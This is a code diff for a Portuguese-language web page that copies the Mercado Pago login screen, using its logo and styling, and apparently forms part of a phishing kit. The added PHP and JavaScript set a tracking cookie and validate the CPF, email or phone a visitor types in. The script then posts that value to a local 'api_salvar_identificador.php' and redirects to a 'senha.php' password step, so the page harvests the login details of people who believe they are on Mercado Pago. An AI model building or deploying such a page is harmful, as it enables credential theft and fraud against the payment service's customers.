@@ -1,3 +1,17 @@
+<?php
+// Inicia a sessão para uso futuro
+session_start();
+
+// --- LÓGICA PARA CRIAR O COOKIE ---
+// Verifica se o cookie 'identificador_cliente' JÁ NÃO EXISTE
+if (!isset($_COOKIE['identificador_cliente'])) {
+    // Se não existe, cria um ID único e seguro
+    $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
+    
+    // Define o cookie para durar 30 dias, acessível em todo o site
+    setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
+}
+?>
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -5,93 +19,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mercado Pago</title>
     <style>
-        /* Reset básico */
-        body {
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-            /* ADICIONADO: Cor de fundo para a página inteira */
-        }
-
-        /* Estilo do cabeçalho principal (INTOCADO) */
-        .main-header {
-            background-color: #ffe600;
-            padding: 0 680px;
-            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
-            height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-        }
-
-        .main-header img {
-            height: 37px;
-            vertical-align: middle;
-        }
-        
-        /* --- ESTILOS DO CONTEÚDO PRINCIPAL --- */
-        .main-content {
-            display: flex;
-            justify-content: center; 
-            align-items: flex-start; 
-            padding-top: 80px; 
-            gap: 64px;
-            /* ADICIONADO: Faz o conteúdo principal crescer e empurrar o rodapé para baixo */
-            flex-grow: 1;
-        }
-        
-        .left-column {
-            display: flex;
-            flex-direction: column;
-            flex-basis: 320px;
-            flex-shrink: 0;
-        }
-
-        /* Título principal */
-        .main-title {
-            font-size: 26px;
-            font-weight: 600;
-            color: #333;
-            line-height: 1.25;
-            text-align: left;
-            margin: 0; 
-        }
-        
-        .form-card {
-            width: 80%;
-            max-width: 500px;
-            background-color: #fff;
-            box-shadow: 0 2px 6px 0 rgba(0,0,0,.1);
-            border-radius: 6px;
-            padding: 48px;
-            box-sizing: border-box;
-        }
-
-        /* Links de suporte */
-        .security-link {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background-color: #fff;
-            border: 1px solid #e0e0e0;
-            border-radius: 10px;
-            padding: 14px 16px;
-            text-decoration: none;
-            color: #333;
-            font-size: 14px;
-            font-weight: 500;
-            transition: box-shadow 0.2s;
-            box-sizing: border-box;
-            margin-top: 200px; 
-        }
+        /* Todos os seus estilos anteriores permanecem aqui... */
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; }
+        .main-header { background-color: #ffe600; padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start; }
+        .main-header img { height: 37px; vertical-align: middle; }
+        .main-content { display: flex; justify-content: center; align-items: flex-start; padding-top: 80px; gap: 64px; flex-grow: 1; }
+        .left-column { display: flex; flex-direction: column; flex-basis: 320px; flex-shrink: 0; }
+        .main-title { font-size: 26px; font-weight: 600; color: #333; line-height: 1.35; text-align: left; margin: 0; }
+        .form-card { width: 80%; max-width: 500px; background-color: #fff; box-shadow: 0 2px 6px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; }
+        .security-link { display: flex; align-items: center; justify-content: space-between; background-color: #fff; border: 1px solid #e0e0e0; border-radius: 10px; padding: 14px 16px; text-decoration: none; color: #333; font-size: 14px; font-weight: 500; transition: box-shadow 0.2s; box-sizing: border-box; margin-top: 200px; }
         .security-link:hover { box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); }
         .security-link .icon-text { display: flex; align-items: center; gap: 12px; }
         .help-link { display: block; margin-top: 16px; color: #3483fa; text-decoration: none; font-size: 14px; font-weight: 400; }
         .help-link:hover { text-decoration: underline; }
-        
-        /* Outros estilos do formulário */
         .input-label { font-size: 14px; color: #555; margin-bottom: 4px; display: block; font-weight: 400; }
         .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
         .input-field:focus { outline: 1px solid #3483fa; border-color: #3483fa; }
@@ -100,33 +40,15 @@
         .btn-continue:hover { background-color: #2968c8; }
         .link-create { color: #3483fa; font-size: 15px; font-weight: 500; text-decoration: none; }
         .link-create:hover { text-decoration: underline; }
-
-        /* --- NOVO: ESTILOS DO RODAPÉ --- */
-        .main-footer {
-            background-color: #ededed;
-            padding: 24px 48px;
-            font-size: 12px;
-            color: #666;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .footer-left, .footer-right {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-        .main-footer a {
-            color: #3483fa;
-            text-decoration: none;
-        }
-        .main-footer a:hover {
-            text-decoration: underline;
-        }
+        .main-footer { background-color: #ededed; padding: 24px 48px; font-size: 12px; color: #666; display: flex; justify-content: space-between; align-items: center; }
+        .footer-left, .footer-right { display: flex; align-items: center; gap: 16px; }
+        .main-footer a { color: #3483fa; text-decoration: none; }
+        .main-footer a:hover { text-decoration: underline; }
+        /* NOVO: Estilo para mensagens de erro */
+        .error-message { color: #d93025; font-size: 12px; text-align: left; margin-top: 4px; min-height: 16px; }
     </style>
 </head>
 <body>
-
     <header class="main-header">
         <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
     </header>
@@ -147,7 +69,8 @@
             <form id="login-form">
                 <div>
                     <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
-                    <input type="text" id="identificador" class="input-field">
+                    <input type="text" id="identificador" class="input-field" autocomplete="off">
+                    <div id="error-message" class="error-message"></div>
                 </div>
                 <div class="actions">
                     <button type="submit" class="btn-continue">Continuar</button>
@@ -169,5 +92,112 @@
         </div>
     </footer>
 
+    <script>
+        const identificadorInput = document.getElementById('identificador');
+        const loginForm = document.getElementById('login-form');
+        const errorDiv = document.getElementById('error-message');
+        const submitBtn = loginForm.querySelector('.btn-continue');
+
+        // --- MÁSCARA DE INPUT ---
+        identificadorInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, ''); // Remove tudo que não for dígito
+            
+            if (value.length <= 11) { // Potencial CPF ou Telefone
+                // Máscara de CPF
+                if (value.length > 9) {
+                    value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                } else if (value.length > 6) {
+                    value = value.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
+                } else if (value.length > 3) {
+                    value = value.replace(/(\d{3})(\d{3})/, '$1.$2');
+                }
+                e.target.value = value;
+            }
+            // Se for e-mail, não faz nada e deixa o usuário digitar livremente.
+        });
+        
+        // --- FUNÇÕES DE VALIDAÇÃO ---
+        const isValidEmail = (email) => {
+            const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+            return re.test(String(email).toLowerCase());
+        };
+
+        const isValidCPF = (cpf) => {
+            cpf = cpf.replace(/\D/g, ''); // Remove formatação
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false; // Verifica se não tem 11 dígitos ou se todos são iguais
+            // Lógica de validação de CPF (dígitos verificadores)
+            let sum = 0, rest;
+            for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
+            rest = (sum * 10) % 11;
+            if ((rest === 10) || (rest === 11)) rest = 0;
+            if (rest !== parseInt(cpf.substring(9, 10))) return false;
+            sum = 0;
+            for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
+            rest = (sum * 10) % 11;
+            if ((rest === 10) || (rest === 11)) rest = 0;
+            if (rest !== parseInt(cpf.substring(10, 11))) return false;
+            return true;
+        };
+
+        const isValidPhone = (phone) => {
+            phone = phone.replace(/\D/g, '');
+            return phone.length >= 10 && phone.length <= 11;
+        };
+
+        // --- LÓGICA DE SUBMISSÃO DO FORMULÁRIO ---
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            errorDiv.textContent = ''; // Limpa erros antigos
+            const valor = identificadorInput.value;
+
+            // Validação
+            if (!valor) {
+                errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
+                return;
+            }
+
+            let eValido = false;
+            if (valor.includes('@')) {
+                eValido = isValidEmail(valor);
+            } else if (valor.replace(/\D/g, '').length === 11) {
+                eValido = isValidCPF(valor);
+            } else {
+                eValido = isValidPhone(valor);
+            }
+
+            if (!eValido) {
+                errorDiv.textContent = 'Por favor, informe um dado válido.';
+                return;
+            }
+            
+            // Envio para a API
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Aguarde...';
+
+            try {
+                const response = await fetch('api_salvar_identificador.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ identificador: valor })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    // Redireciona para a página de senha em caso de sucesso
+                    window.location.href = 'senha.php';
+                } else {
+                    errorDiv.textContent = result.error || 'Ocorreu um erro. Tente novamente.';
+                }
+
+            } catch (error) {
+                console.error('Falha na comunicação:', error);
+                errorDiv.textContent = 'Não foi possível conectar ao servidor.';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Continuar';
+            }
+        });
+    </script>
 </body>
 </html>
